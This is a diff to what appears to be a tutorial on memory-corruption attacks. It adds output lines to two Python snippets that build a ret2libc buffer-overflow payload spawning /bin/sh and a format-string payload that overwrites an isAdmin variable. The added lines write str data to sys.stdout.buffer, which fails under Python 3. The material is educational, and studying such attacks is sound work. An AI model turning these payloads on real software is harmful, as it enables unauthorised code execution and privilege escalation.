@@ -92,12 +92,15 @@ payload = 'A'*787 + addr of system() + ret addr for system() + addr of "/bin/sh"
 ```
 When the variables are filled in with their memory addresses, the final exploit code looks as follows:
 ```python
+import sys
+
 FILL = "\x41"*787
 SYS = "\x50\x72\xe2\xb7"
 SYSRET = "\x20\xa4\xe1\xb7"
 STR_PTR = "\xe4\xff\xff\xbf"
 
 payload = FILL + SYS + SYSRET + STR_PTR
+sys.stdout.buffer.write(payload)
 ```
 ## Data-only attacks
 Data corruption may allow the attacker to achieve their goals without diverting the target software from its expected path of machine-code execution, either directly or indirectly. Such attacks are referred to as data-only, or non-control-data attacks. Examples of this are string vulnerabilities that utilize format string functions (e.g. `printf()`) to achieve information leaks or arbitrary code execution.
@@ -115,12 +118,15 @@ Hello AAAAA.80486e0.bffff6dc. ... .b7fff000.6c654807.41206f6c.41414141.!
 ```
 This can allow us to read (or even overwrite) any data on the stack. Suppose there is an admin function that only executes whenever the `isAdmin` variable is true. We can look for its address in gdb and overwrite it as follows:
 ```python
+import sys
+
 # A is the value written to the target address (can even be a number)
 TARGET = "A\x9c\x99\x04\x08"
 FSTRING = "%x."*10
 NUMBER = "%n."
 
 payload = TARGET + FSTRING + NUMBER
+sys.stdout.buffer.write(payload)
 ```
 These vulnerabilities have become rare nowadays, as most modern compilers produce warnings when format functions are called with non-constant strings (which is the root cause of this vulnerability).
 
